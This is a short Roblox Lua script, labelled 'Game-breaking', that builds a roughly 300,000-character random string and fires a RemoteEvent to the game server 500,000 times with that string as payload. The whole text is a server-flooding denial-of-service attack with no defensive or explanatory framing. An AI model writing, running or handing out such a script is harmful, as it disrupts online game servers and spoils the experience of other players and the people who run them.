-- Game-breaking shaped: remote spam + huge random string
local s = ""
for i = 1, 300000 do
    s = s .. string.char(math.random(33,126))
end

for i = 1, 500000 do
    game.ReplicatedStorage.RemoteEvent:FireServer("PAYLOAD_" .. tostring(i), s)
end
